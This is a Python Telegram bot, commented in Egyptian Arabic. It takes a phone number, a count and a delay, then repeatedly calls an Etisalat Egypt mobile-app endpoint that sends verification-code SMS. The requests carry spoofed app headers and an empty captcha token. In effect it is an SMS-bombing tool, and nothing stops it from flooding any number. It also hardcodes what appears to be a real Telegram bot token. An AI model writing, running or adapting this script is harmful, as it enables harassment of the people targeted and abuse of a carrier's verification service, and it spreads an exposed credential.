import os
import requests
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

BOT_TOKEN = os.getenv("BOT_TOKEN") or "8441832522:AAF7JRh0aw1X2diiCFdg8Fx9cGU2L-1NXuY"
PORT = int(os.environ.get('PORT', '8443'))
APP_URL = os.getenv("APP_URL")  # سيبها زي ما هي على Railway

ASK_NUMBER, ASK_COUNT, ASK_DELAY = range(3)

# -----------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📱 مرحبًا! من فضلك ابعت رقم اتصالات الخاص بك:")
    return ASK_NUMBER

async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["number"] = update.message.text.strip()
    await update.message.reply_text("🔢 ابعت عدد الرسائل اللي عايز تبعتها:")
    return ASK_COUNT

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data["count"] = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("❌ ادخل رقم صحيح للعدد.")
        return ASK_COUNT
    await update.message.reply_text("⏱ ابعت عدد الثواني بين كل رسالة:")
    return ASK_DELAY

async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data["delay"] = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("❌ ادخل رقم صحيح للثواني.")
        return ASK_DELAY

    number = context.user_data["number"]
    count = context.user_data["count"]
    delay = context.user_data["delay"]

    url = "https://mab.etisalat.com.eg:11003/Saytar/rest/quickAccess/sendVerCodeQuickAccessV4"

    headers = {
        'Host': "mab.etisalat.com.eg:11003",
        'User-Agent': "okhttp/5.0.0-alpha.11",
        'Connection': "Keep-Alive",
        'Accept': "text/xml",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/xml",
        'applicationVersion': "2",
        'applicationName': "MAB",
        'Language': "ar",
        'APP-BuildNumber': "10650",
        'APP-Version': "33.1.0",
        'OS-Type': "Android",
        'OS-Version': "13",
        'APP-STORE': "GOOGLE",
        'C-Type': "4G",
        'Is-Corporate': "false",
        'ADRUM_1': "isMobile:true",
        'ADRUM': "isAjax:true",
    }

    payload_template = """<?xml version='1.0' encoding='UTF-8' standalone='no' ?>
<sendVerCodeQuickAccessRequest>
    <dial>{number}</dial>
    <hCaptchaToken></hCaptchaToken>
    <udid></udid>
</sendVerCodeQuickAccessRequest>"""

    for i in range(count):
        payload = payload_template.format(number=number)
        try:
            response = requests.post(url, data=payload, headers=headers)
            if "true" in response.text:
                await update.message.reply_text(f"✅ تم إرسال الرسالة {i+1}/{count}")
            else:
                await update.message.reply_text(f"❌ فشل إرسال الرسالة {i+1}/{count}")
        except Exception as e:
            await update.message.reply_text(f"❌ حدث خطأ: {e}")
        time.sleep(delay)

    await update.message.reply_text("✅ تم إرسال كل الرسائل!")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚫 تم إلغاء العملية.")
    return ConversationHandler.END

# -----------------------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            ASK_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            ASK_DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    app.add_handler(conv_handler)

    # Webhook setup
    app.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        webhook_url=f"{APP_URL}/{BOT_TOKEN}"
    )

if __name__ == "__main__":
    main()